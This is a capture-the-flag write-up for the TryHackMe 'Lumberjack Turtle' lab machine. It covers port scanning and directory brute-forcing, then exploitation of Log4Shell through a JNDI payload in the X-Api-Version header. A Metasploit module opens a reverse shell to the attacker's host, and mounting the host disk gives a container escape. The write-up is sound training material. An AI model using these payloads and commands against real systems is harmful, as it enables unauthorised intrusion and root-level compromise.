# Lumberjack Turtle

URL: https://tryhackme.com/room/lumberjackturtle

Level: Medium

Date: 24 Sep 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [Dirbusting](#dirbusting)
	- [Log4j](#log4j)
- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root flag](#root-flag)




## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -nn -p- 10.10.195.77 -oN nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 12:03 CEST
Nmap scan report for 10.10.195.77
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 85.96 seconds
```

```bash
$ sudo nmap -T4 -nn -p80 -sC -sV 10.10.195.77 -oN nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 12:05 CEST
Nmap scan report for 10.10.195.77
Host is up (0.068s latency).

PORT   STATE SERVICE     VERSION
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```

### HTTP

```bash
$ curl  10.10.195.77
What you doing here? There is nothing for you to C. Grab a cup of java and look deeper.
```

Maybe it's time to run `feroxbuster`

### dirbusting



```bash
$ gobuster dir -u http://10.10.148.36 -w /opt/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.148.36
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/09/26 10:16:26 Starting gobuster in directory enumeration mode
===============================================================
/error                (Status: 500) [Size: 73]
/~logs                (Status: 200) [Size: 29]
Progress: 4712 / 4713 (99.98%)
===============================================================
2023/09/26 10:20:05 Finished
===============================================================


```

![](Pasted%20image%2020230924123732.png)

```bash
$ curl http://10.10.148.36/~logs
No logs, no crime. Go deeper.
```

Maybe we need to use recursion, and `gobuster` is not the right tool :)

```bash
joshua@kaligra:~/Documents/thm/lumberjackturtle$ feroxbuster --silent -u http://10.10.148.36/~logs -t 200 -d 4 -w /opt/SecLists/Discovery/Web-Content/common.txt
http://10.10.148.36/~logs
http://10.10.148.36/~logs/log4j
```

### log4j

![](Pasted%20image%2020230926102601.png)

Let's try with https://canarytokens.org and generate a canary for `Log4Shell`


![](Pasted%20image%2020230926104340.png)

```bash
$ curl http://10.10.148.36/~logs/log4j -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.j7l4piadg5uf610s5sr7t2vag.canarytokens.com/a}'
```

It seems we have some positive result:

![](Pasted%20image%2020230926105010.png)

But, as we know, target machine has no internet reacheability.

```bash
msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 10.10.148.36
RHOSTS => 10.10.148.36
msf6 auxiliary(scanner/http/log4shell_scanner) > set TARGETURI /~logs/log4j
TARGETURI => /~logs/log4j
msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST tun0
SRVHOST => 10.8.100.14
msf6 auxiliary(scanner/http/log4shell_scanner) > run

[+] 10.10.148.36:80       - Log4Shell found via /~logs/log4j (header: X-Api-Version) (os: Linux 4.15.0-163-generic unknown, architecture: amd64-64) (java: Oracle Corporation_1.8.0_181)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Sleeping 30 seconds for any last LDAP connections
[*] Server stopped.
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/log4shell_scanner) >

```

We then use `multi/http/log4shell_header_injection`:

```bash
msf6 exploit(multi/http/log4shell_header_injection) > set RHOSTS 10.10.148.36
RHOSTS => 10.10.148.36
msf6 exploit(multi/http/log4shell_header_injection) > set LHOST tun0
LHOST => 10.8.100.14
msf6 exploit(multi/http/log4shell_header_injection) > set TARGETURI /~logs/log4j
TARGETURI => /~logs/log4j
msf6 exploit(multi/http/log4shell_header_injection) > set SRVHOST tun0
SRVHOST => 10.8.100.14
msf6 exploit(multi/http/log4shell_header_injection) > run

[*] Started reverse TCP handler on 10.8.100.14:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using auxiliary/scanner/http/log4shell_scanner as check
[+] 10.10.148.36:80       - Log4Shell found via /~logs/log4j (header: X-Api-Version) (os: Linux 4.15.0-163-generic unknown, architecture: amd64-64) (java: Oracle Corporation_1.8.0_181)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Sleeping 30 seconds for any last LDAP connections
[*] Server stopped.
[+] The target is vulnerable.
[+] Automatically identified vulnerable header: X-Api-Version
[*] Serving Java code on: http://10.8.100.14:8080/EdjfiVDvUV3q.jar
[*] Command shell session 1 opened (10.8.100.14:4444 -> 10.10.148.36:38904) at 2023-09-26 10:59:42 +0200

[*] Server stopped.

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

## user flag

after a bit we found the first flag:

```bash
ls -la /opt
total 12
drwxr-xr-x    1 root     root          4096 Dec 11  2021 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
-rw-r--r--    1 root     root            19 Dec 11  2021 .flag1
cat /opt/.flag1
THM{LOG4SHEXXXXXX}
```

## privilege escalation

let's check mounted filesystems

```bash
mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/IVRIXPIPTAUXLMA5W6H67HBIQQ:/var/lib/docker/overlay2/l/SQQT6HBAR3TRQG3IBJAXB7TEIU:/var/lib/docker/overlay2/l/NIZU7EGXOSQLBNUX3TPNWZVUN7:/var/lib/docker/overlay2/l/2C3UM7KSHOQFXMNHLV4UKRHUBA:/var/lib/docker/overlay2/l/PVFSC72LOH4QLOHE2N2M6PO3UL:/var/lib/docker/overlay2/l/BPIAR6WYRW3AONIZA2QK75LNX3:/var/lib/docker/overlay2/l/QJ4UCS3NWCXAINAYJMJONR5IRK:/var/lib/docker/overlay2/l/ALNGHDOKRDHGZIU4CJY7VYW5M5:/var/lib/docker/overlay2/l/PW6ZRSVQMA65T2JMYNI3B2N2SI:/var/lib/docker/overlay2/l/JCGLSV7ETSUUDJI2UQEXQBKHAV,upperdir=/var/lib/docker/overlay2/45f5ba1171dd637879f1e304a84acac05fad98331af1c87c495022ecb2f61bca/diff,workdir=/var/lib/docker/overlay2/45f5ba1171dd637879f1e304a84acac05fad98331af1c87c495022ecb2f61bca/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)
/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,data=ordered)
/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,data=ordered)
```

Let's try to mount `/dev/xvda1`:

```bash
mount /dev/xvda1 /mnt/asd
cd /mnt/asd
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

## root flag

```bash
./root/.../._fLaG2
cat ./root/.../._fLaG2
THM{C0NT41N3R_XXXXXX}
```

